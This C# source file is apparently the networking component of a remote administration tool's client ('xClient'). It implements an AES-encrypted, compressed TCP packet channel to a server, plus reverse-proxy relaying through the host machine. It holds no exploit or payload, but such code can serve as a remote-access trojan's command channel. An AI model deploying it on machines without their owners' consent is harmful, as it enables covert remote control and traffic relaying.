﻿using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Threading;
using ProtoBuf;
using ProtoBuf.Meta;
using xClient.Core.Compression;
using xClient.Core.Encryption;
using xClient.Core.Extensions;
using xClient.Core.Packets;
using xClient.Core.ReverseProxy;
using xClient.Core.ReverseProxy.Packets;

namespace xClient.Core.Networking
{
    public class Client
    {
        /// <summary>
        /// Occurs as a result of an unrecoverable issue with the client.
        /// </summary>
        public event ClientFailEventHandler ClientFail;

        /// <summary>
        /// Represents a method that will handle failure of the client.
        /// </summary>
        /// <param name="s">The client that has failed.</param>
        /// <param name="ex">The exception containing information about the cause of the client's failure.</param>
        public delegate void ClientFailEventHandler(Client s, Exception ex);

        /// <summary>
        /// Fires an event that informs subscribers that the client has failed.
        /// </summary>
        /// <param name="ex">The exception containing information about the cause of the client's failure.</param>
        private void OnClientFail(Exception ex)
        {
            if (ClientFail != null)
            {
                ClientFail(this, ex);
            }
        }

        /// <summary>
        /// Occurs when the state of the client has changed.
        /// </summary>
        public event ClientStateEventHandler ClientState;

        /// <summary>
        /// Represents the method that will handle a change in the client's state
        /// </summary>
        /// <param name="s">The client which changed its state.</param>
        /// <param name="connected">The new connection state of the client.</param>
        public delegate void ClientStateEventHandler(Client s, bool connected);

        /// <summary>
        /// Fires an event that informs subscribers that the state of the client has changed.
        /// </summary>
        /// <param name="connected">The new connection state of the client.</param>
        private void OnClientState(bool connected)
        {
            if (Connected == connected) return;

            Connected = connected;
            if (ClientState != null)
            {
                ClientState(this, connected);
            }
        }

        /// <summary>
        /// Occurs when a packet is received from the server.
        /// </summary>
        public event ClientReadEventHandler ClientRead;

        /// <summary>
        /// Represents a method that will handle a packet from the server.
        /// </summary>
        /// <param name="s">The client that has received the packet.</param>
        /// <param name="packet">The packet that has been received by the server.</param>
        public delegate void ClientReadEventHandler(Client s, IPacket packet);

        /// <summary>
        /// Fires an event that informs subscribers that a packet has been received by the server.
        /// </summary>
        /// <param name="packet">The packet that has been received by the server.</param>
        private void OnClientRead(IPacket packet)
        {
            if (ClientRead != null)
            {
                ClientRead(this, packet);
            }
        }

        /// <summary>
        /// Occurs when a packet is sent by the client.
        /// </summary>
        public event ClientWriteEventHandler ClientWrite;

        /// <summary>
        /// Represents the method that will handle the sent packet.
        /// </summary>
        /// <param name="s">The client that has sent the packet.</param>
        /// <param name="packet">The packet that has been sent by the client.</param>
        /// <param name="length">The length of the packet.</param>
        /// <param name="rawData">The packet in raw bytes.</param>
        public delegate void ClientWriteEventHandler(Client s, IPacket packet, long length, byte[] rawData);

        /// <summary>
        /// Fires an event that informs subscribers that the client has sent a packet.
        /// </summary>
        /// <param name="packet">The packet that has been sent by the client.</param>
        /// <param name="length">The length of the packet.</param>
        /// <param name="rawData">The packet in raw bytes.</param>
        private void OnClientWrite(IPacket packet, long length, byte[] rawData)
        {
            if (ClientWrite != null)
            {
                ClientWrite(this, packet, length, rawData);
            }
        }

        /// <summary>
        /// The type of the packet received.
        /// </summary>
        public enum ReceiveType
        {
            Header,
            Payload
        }

        /// <summary>
        /// The buffer size for receiving data in bytes.
        /// </summary>
        public int BUFFER_SIZE { get { return (1024 * 1024) * 1; } } // 1MB

        /// <summary>
        /// The keep-alive time in ms.
        /// </summary>
        public uint KEEP_ALIVE_TIME { get { return 25000; } } // 25s

        /// <summary>
        /// The keep-alive interval in ms.
        /// </summary>
        public uint KEEP_ALIVE_INTERVAL { get { return 25000; } } // 25s

        /// <summary>
        /// The header size in bytes.
        /// </summary>
        public int HEADER_SIZE { get { return 3; } } // 3B

        /// <summary>
        /// Returns an array containing all of the proxy clients of this client.
        /// </summary>
        public ReverseProxyClient[] ProxyClients
        {
            get
            {
                lock (_proxyClientsLock)
                {
                    return _proxyClients.ToArray();
                }
            }
        }

        /// <summary>
        /// Handle of the Client Socket.
        /// </summary>
        private Socket _handle;

        /// <summary>
        /// A list of all the connected proxy clients that this client holds.
        /// </summary>
        private List<ReverseProxyClient> _proxyClients;

        /// <summary>
        /// Lock object for the list of proxy clients.
        /// </summary>
        private readonly object _proxyClientsLock = new object();

        /// <summary>
        /// The internal index of the packet type.
        /// </summary>
        private int _typeIndex;

        /// <summary>
        /// The buffer for incoming packets.
        /// </summary>
        private byte[] _readBuffer;

        /// <summary>
        /// The buffer for the client's incoming payload.
        /// </summary>
        private byte[] _payloadBuffer;

        /// <summary>
        /// The Queue which holds buffers to send.
        /// </summary>
        private readonly Queue<byte[]> _sendBuffers = new Queue<byte[]>();

        /// <summary>
        /// Determines if the client is currently sending packets.
        /// </summary>
        private bool _sendingPackets;

        /// <summary>
        /// Lock object for the sending packets boolean.
        /// </summary>
        private readonly object _sendingPacketsLock = new object();

        /// <summary>
        /// The Queue which holds buffers to read.
        /// </summary>
        private readonly Queue<byte[]> _readBuffers = new Queue<byte[]>();

        /// <summary>
        /// Determines if the client is currently reading packets.
        /// </summary>
        private bool _readingPackets;

        /// <summary>
        /// Lock object for the reading packets boolean.
        /// </summary>
        private readonly object _readingPacketsLock = new object();

        /// <summary>
        /// The temporary header to store parts of the header.
        /// </summary>
        /// <remarks>
        /// This temporary header is used when we have i.e.
        /// only 2 bytes left to read from the buffer but need more
        /// which can only be read in the next Receive callback
        /// </remarks>
        private byte[] _tempHeader;

        /// <summary>
        /// Decides if we need to append bytes to the header.
        /// </summary>
        private bool _appendHeader;

        // Receive info
        private int _readOffset;
        private int _writeOffset;
        private int _tempHeaderOffset;
        private int _readableDataLen;
        private int _payloadLen;
        private ReceiveType _receiveState = ReceiveType.Header;

        /// <summary>
        /// Gets if the client is currently connected to a server.
        /// </summary>
        public bool Connected { get; private set; }

        private const bool encryptionEnabled = true;
        private const bool compressionEnabled = true;

        public Client()
        {
        }

        /// <summary>
        /// Attempts to connect to the specified host on the specified port.
        /// </summary>
        /// <param name="host">The host (or server) to connect to.</param>
        /// <param name="port">The port of the host.</param>
        public void Connect(string host, ushort port)
        {
            try
            {
                Disconnect();
                Initialize();

                _handle = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                _handle.SetKeepAliveEx(KEEP_ALIVE_INTERVAL, KEEP_ALIVE_TIME);

                _readBuffer = new byte[BUFFER_SIZE];
                _tempHeader = new byte[HEADER_SIZE];

                _handle.Connect(host, port);

                if (_handle.Connected)
                {
                    _handle.BeginReceive(_readBuffer, 0, _readBuffer.Length, SocketFlags.None, AsyncReceive, null);
                    OnClientState(true);
                }
            }
            catch (Exception ex)
            {
                OnClientFail(ex);
            }
        }

        private void Initialize()
        {
            AddTypeToSerializer(typeof (IPacket), typeof (UnknownPacket));
            lock (_proxyClientsLock)
            {
                _proxyClients = new List<ReverseProxyClient>();
            }
        }

        private void AsyncReceive(IAsyncResult result)
        {
            try
            {
                int bytesTransferred;

                try
                {
                    bytesTransferred = _handle.EndReceive(result);

                    if (bytesTransferred <= 0)
                    {
                        OnClientState(false);
                        return;
                    }
                }
                catch (Exception)
                {
                    OnClientState(false);
                    return;
                }

                byte[] received = new byte[bytesTransferred];
                Array.Copy(_readBuffer, received, received.Length);
                lock (_readBuffers)
                {
                    _readBuffers.Enqueue(received);
                }

                lock (_readingPacketsLock)
                {
                    if (!_readingPackets)
                    {
                        _readingPackets = true;
                        ThreadPool.QueueUserWorkItem(AsyncReceive);
                    }
                }
            }
            catch
            {
            }

            try
            {
                _handle.BeginReceive(_readBuffer, 0, _readBuffer.Length, SocketFlags.None, AsyncReceive, null);
            }
            catch (ObjectDisposedException)
            {
            }
            catch (Exception ex)
            {
                OnClientFail(ex);
            }
        }

        private void AsyncReceive(object state)
        {
            while (true)
            {
                byte[] readBuffer;
                lock (_readBuffers)
                {
                    if (_readBuffers.Count == 0)
                    {
                        lock (_readingPacketsLock)
                        {
                            _readingPackets = false;
                        }
                        return;
                    }

                    readBuffer = _readBuffers.Dequeue();
                }

                _readableDataLen += readBuffer.Length;
                bool process = true;
                while (process)
                {
                    switch (_receiveState)
                    {
                        case ReceiveType.Header:
                            {
                                if (_readableDataLen >= HEADER_SIZE)
                                { // we can read the header
                                    int size = (_appendHeader) ?
                                        HEADER_SIZE - _tempHeaderOffset
                                        : HEADER_SIZE;

                                    try
                                    {
                                        if (_appendHeader)
                                        {
                                            Array.Copy(readBuffer, _readOffset, _tempHeader, _tempHeaderOffset, size);
                                            _payloadLen = (int)_tempHeader[0] | _tempHeader[1] << 8 | _tempHeader[2] << 16;
                                            _tempHeaderOffset = 0;
                                            _appendHeader = false;
                                        }
                                        else
                                        {
                                            _payloadLen = (int)readBuffer[_readOffset] | readBuffer[_readOffset + 1] << 8 |
                                                readBuffer[_readOffset + 2] << 16;
                                        }

                                        if (_payloadLen <= 0)
                                            throw new Exception("invalid header");
                                    }
                                    catch (Exception)
                                    {
                                        process = false;
                                        break;
                                    }

                                    _readableDataLen -= size;
                                    _readOffset += size;
                                    _receiveState = ReceiveType.Payload;
                                }
                                else // _parentServer.HEADER_SIZE < _readableDataLen
                                {
                                    _appendHeader = true;
                                    Array.Copy(readBuffer, _readOffset, _tempHeader, _tempHeaderOffset, _readableDataLen);
                                    _tempHeaderOffset += _readableDataLen;
                                    process = false;
                                }
                                break;
                            }
                        case ReceiveType.Payload:
                            {
                                if (_payloadBuffer == null || _payloadBuffer.Length != _payloadLen)
                                    _payloadBuffer = new byte[_payloadLen];

                                int length = _readableDataLen;
                                if (_writeOffset + _readableDataLen >= _payloadLen)
                                {
                                    length = _payloadLen - _writeOffset;
                                }

                                try
                                {
                                    Array.Copy(readBuffer, _readOffset, _payloadBuffer, _writeOffset, length);
                                }
                                catch
                                {
                                    Disconnect();
                                }

                                _writeOffset += length;
                                _readOffset += length;
                                _readableDataLen -= length;

                                if (_writeOffset == _payloadLen)
                                {
                                    if (encryptionEnabled)
                                        _payloadBuffer = AES.Decrypt(_payloadBuffer);

                                    if (_payloadBuffer.Length > 0)
                                    {
                                        if (compressionEnabled)
                                            _payloadBuffer = new SafeQuickLZ().Decompress(_payloadBuffer, 0, _payloadBuffer.Length);

                                        using (MemoryStream deserialized = new MemoryStream(_payloadBuffer))
                                        {
                                            IPacket packet =
                                                Serializer.DeserializeWithLengthPrefix<IPacket>(deserialized, PrefixStyle.Fixed32);

                                            OnClientRead(packet);
                                        }
                                    }
                                    else // payload decryption failed
                                        process = false;

                                    _receiveState = ReceiveType.Header;
                                    _payloadBuffer = null;
                                    _payloadLen = 0;
                                    _writeOffset = 0;
                                }

                                if (_readableDataLen == 0)
                                    process = false;

                                break;
                            }
                    }
                }

                if (_receiveState == ReceiveType.Header)
                {
                    _writeOffset = 0; // prepare for next packet
                }
                _readOffset = 0;
                _readableDataLen = 0;
            }
        }

        /// <summary>
        /// Sends a packet to the connected server.
        /// </summary>
        /// <typeparam name="T">The type of the packet.</typeparam>
        /// <param name="packet">The packet to be send.</param>
        public void Send<T>(T packet) where T : IPacket
        {
            if (!Connected) return;

            lock (_sendBuffers)
            {
                try
                {
                    using (MemoryStream ms = new MemoryStream())
                    {
                        Serializer.SerializeWithLengthPrefix<T>(ms, packet, PrefixStyle.Fixed32);

                        byte[] payload = ms.ToArray();

                        _sendBuffers.Enqueue(payload);

                        OnClientWrite(packet, payload.LongLength, payload);

                        lock (_sendingPacketsLock)
                        {
                            if (_sendingPackets) return;

                            _sendingPackets = true;
                        }
                        ThreadPool.QueueUserWorkItem(Send);
                    }
                }
                catch
                {
                }
            }
        }

        /// <summary>
        /// Sends a packet to the connected server.
        /// Blocks the thread until all packets have been sent.
        /// </summary>
        /// <typeparam name="T">The type of the packet.</typeparam>
        /// <param name="packet">The packet to be send.</param>
        public void SendBlocking<T>(T packet) where T : IPacket
        {
            Send(packet);
            while (_sendingPackets)
            {
                Thread.Sleep(10);
            }
        }

        private void Send(object state)
        {
            while (true)
            {
                if (!Connected)
                {
                    SendCleanup(true);
                    return;
                }

                byte[] payload;
                lock (_sendBuffers)
                {
                    if (_sendBuffers.Count == 0)
                    {
                        SendCleanup();
                        return;
                    }

                    payload = _sendBuffers.Dequeue();
                }

                if (compressionEnabled)
                    payload = new SafeQuickLZ().Compress(payload, 0, payload.Length, 3);

                if (encryptionEnabled)
                    payload = AES.Encrypt(payload);

                byte[] header = new byte[]
                {
                    (byte)payload.Length,
                    (byte)(payload.Length >> 8),
                    (byte)(payload.Length >> 16)
                };

                byte[] data = new byte[payload.Length + HEADER_SIZE];
                Array.Copy(header, data, header.Length);
                Array.Copy(payload, 0, data, HEADER_SIZE, payload.Length);

                try
                {
                    _handle.Send(data);
                }
                catch (Exception ex)
                {
                    OnClientFail(ex);
                    SendCleanup(true);
                    return;
                }
            }
        }

        private void SendCleanup(bool clear = false)
        {
            lock (_sendingPacketsLock)
            {
                _sendingPackets = false;
            }

            if (!clear) return;

            lock (_sendBuffers)
            {
                _sendBuffers.Clear();
            }
        }

        /// <summary>
        /// Disconnect the client from the server, disconnect all proxies that
        /// are held by this client, and dispose of other resources associated
        /// with this client.
        /// </summary>
        public void Disconnect()
        {
            OnClientState(false);

            if (_handle != null)
            {
                _handle.Close();
                _readOffset = 0;
                _writeOffset = 0;
                _readableDataLen = 0;
                _payloadLen = 0;
                _payloadBuffer = null;
                if (_proxyClients != null)
                {
                    lock (_proxyClientsLock)
                    {
                        foreach (ReverseProxyClient proxy in _proxyClients)
                            proxy.Disconnect();
                    }
                }
                Commands.CommandHandler.StreamCodec = null;
            }
        }

        /// <summary>
        /// Adds a Type to the serializer so a message can be properly serialized.
        /// </summary>
        /// <param name="parent">The parent type.</param>
        /// <param name="type">Type to be added.</param>
        public void AddTypeToSerializer(Type parent, Type type)
        {
            if (type == null || parent == null)
                throw new ArgumentNullException();

            bool isAlreadyAdded = RuntimeTypeModel.Default[parent].GetSubtypes().Any(subType => subType.DerivedType.Type == type);

            if (!isAlreadyAdded)
                RuntimeTypeModel.Default[parent].AddSubType(_typeIndex += 1, type);
        }

        /// <summary>
        /// Adds Types to the serializer.
        /// </summary>
        /// <param name="parent">The parent type, i.e.: IPacket</param>
        /// <param name="types">Types to add.</param>
        public void AddTypesToSerializer(Type parent, params Type[] types)
        {
            foreach (Type type in types)
                AddTypeToSerializer(parent, type);
        }

        public void ConnectReverseProxy(ReverseProxyConnect command)
        {
            lock (_proxyClientsLock)
            {
                _proxyClients.Add(new ReverseProxyClient(command, this));
            }
        }

        public ReverseProxyClient GetReverseProxyByConnectionId(int connectionId)
        {
            lock (_proxyClientsLock)
            {
                return _proxyClients.FirstOrDefault(t => t.ConnectionId == connectionId);
            }
        }

        public void RemoveProxyClient(int connectionId)
        {
            try
            {
                lock (_proxyClientsLock)
                {
                    for (int i = 0; i < _proxyClients.Count; i++)
                    {
                        if (_proxyClients[i].ConnectionId == connectionId)
                        {
                            _proxyClients.RemoveAt(i);
                            break;
                        }
                    }
                }
            }
            catch { }
        }
    }
}